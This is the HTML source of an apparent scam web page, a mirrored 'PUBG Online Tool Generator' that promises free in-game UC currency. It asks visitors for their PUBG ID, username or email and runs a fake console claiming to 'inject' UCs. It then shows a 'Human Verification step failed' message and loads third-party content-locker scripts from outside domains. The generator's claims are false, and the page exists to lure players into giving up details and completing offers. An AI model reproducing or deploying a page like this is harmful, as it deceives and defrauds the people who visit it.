...
<head>
	...
	<meta property="og:description" content="Playerunknown's Battlegrounds Online is an online Tool that will help you to generate Gems and gold on your iOS or Android device." />
    ...
    <!-- CSS -->
	<link href="images/css28d1.css?family=Oswald:300,400,700|Raleway:300,400,700" rel="stylesheet"> 	
    ...
    <link rel="shortcut icon" href="logo.html" /> 
				...
				<div class="row">
					<div class="main-content-wrapper col-sm-12">
						<div class="section-title-wrapper">
							<h2>PUBG Online Tool Generator</h2>
						</div>
						<div id="csr-generator" class="csr-generator-wrapper row">
							<div class="row no-margin">
							<div class="col-md-5 csr-generator-left-side">
								<div class="username-wrapper">
									<label>PUBG ID/Username/Email:</label>
									<input id="username-input" name="username" type="text" class="username-input" placeholder="Your PUBG ID/Username/Email..."/>
								</div>
									...
									<div class="row">
										<div class="platform-select-item-wrapper col-sm-6">
											<div class="platform-select-item pb-1">
												<div>
												<img class="img-responsive platform-select-img black" alt="Amazon Console" src="images/platform-img-1-b.png">
												<img class="img-responsive platform-select-img" alt="Android Console" src="images/platform-img-1.png">
												</div>
										...
										<div class="platform-select-item-wrapper col-sm-6">
											<div class="platform-select-item pb-2">
												<img class="img-responsive platform-select-img black" alt="Amazon Console" src="images/platform-img-2-b.png">
												<img class="img-responsive platform-select-img" alt="iOS Console" src="images/platform-img-2.png">
							...
							<div id="resources-select-outer" class="col-md-7 generator-disabled">
								<div class="crs-cash-select-wrapper">
									<div class="col-sm-12"><span class="csr-generator-section-title">Free UC Load</span></div>
									<div class="col-sm-4">
										<div class="crs-cash-select-item crs-select-item cash-1"  id="credits">
											<img class="img-responsive resource-select-img" alt="CSR Generator Select Cash" src="images/csr-c-select-img.png">
									...
									<div class="col-sm-4">
										<div class="crs-cash-select-item crs-select-item cash-1"  id="credits">
											<img class="img-responsive resource-select-img" alt="CSR Generator Select Cash" src="images/csr-c-select-img.png">
											<span class="crs-select-title">5,000</span>
										</div>
									</div>
									<div class="col-sm-4">
										<div class="crs-cash-select-item crs-select-item cash-1"  id="credits">
											<img class="img-responsive resource-select-img" alt="CSR Generator Select Cash" src="images/csr-c-select-img.png">
											<span class="crs-select-title">10,000</span>
										</div>
									</div>
...
<div class="col-sm-4">
										<div class="crs-cash-select-item crs-select-item cash-1"  id="credits">
											<img class="img-responsive resource-select-img" alt="CSR Generator Select Cash" src="images/csr-c-select-img.png">
											<span class="crs-select-title">30,000</span>
										</div>
									</div>
<div class="col-sm-4">
										<div class="crs-cash-select-item crs-select-item cash-1"  id="credits">
											<img class="img-responsive resource-select-img" alt="CSR Generator Select Cash" src="images/csr-c-select-img.png">
											<span class="crs-select-title">50,000</span>
										</div>
									</div>
<div class="col-sm-4">
										<div class="crs-cash-select-item crs-select-item cash-1"  id="credits">
											<img class="img-responsive resource-select-img" alt="CSR Generator Select Cash" src="images/csr-c-select-img.png">
											<span class="crs-select-title">100,000</span>
										</div>
									</div>
								...
								<div class="crs-Resources-select-wrapper" style="display:none;">
									...
									<div class="col-sm-4">
										<div class="crs-Resources-select-item crs-select-item Resources-1" id="blue">
											<img class="img-responsive resource-select-img" alt="CSR Generator Select Resources" src="images/csr-g-select-img.png">
						...
						<div id="csr-generator-console" class="csr-generator-console-wrapper row">
							...
							<div class="console-messages">
								...
								<div class="console-message console-message-10">
									Starting to Inject UCs...
								</div>
								<div class="console-message console-message-11">
									<span class="green-success-console">Checking UCs available for injection...</span>
								</div>
							...
							<p>Human Verification step failed, we need to verify that you are a Human and not a bot (software)!</p>
								<div id="fountainG">
					...
					<div class="X00Container">
						<div class="X00ContainerTop" style=" height: 0px!important; border-top-left-radius: 4px; border-top-right-radius: 4px;">
							<span class="yellow_text" style=" font-size: 16px; position: relative; font-weight: 100; bottom: 10px;">
								PUBG Chatroom (<span id="online2"></span>)</span>
						</div>
		...
		<script type="text/javascript" src="images/jquery.parallax-1.1.3.js"></script>
		<script type="text/javascript" src="images/com.js"></script>
		<script type="text/javascript" src="images/sweet-alert.min.js"></script>
		<script type="text/javascript" src="images/jquery.animatecss.min.js"></script>
		...
		<script type="text/javascript" src="images/jquery.smooth-scroll.min.js"></script>
		...
		<script type="text/javascript" src="images/main.js"></script>
               <script type="text/javascript" src="https://downloadtuesday.com/script_include.php?id=637251"></script>
			<script type="text/javascript" src="https://www.areyouahuman.co/contentlockers/load.php?id=8c5dcb811f06e5044d84a8a33da586b8"></script>
...
<!-- Mirrored from pdevo.com/nolimits/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 18 Jun 2017 00:10:13 GMT -->

<!-- Mirrored from gameboost.org/pokemongo/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 24 Nov 2017 13:16:25 GMT -->
</html>
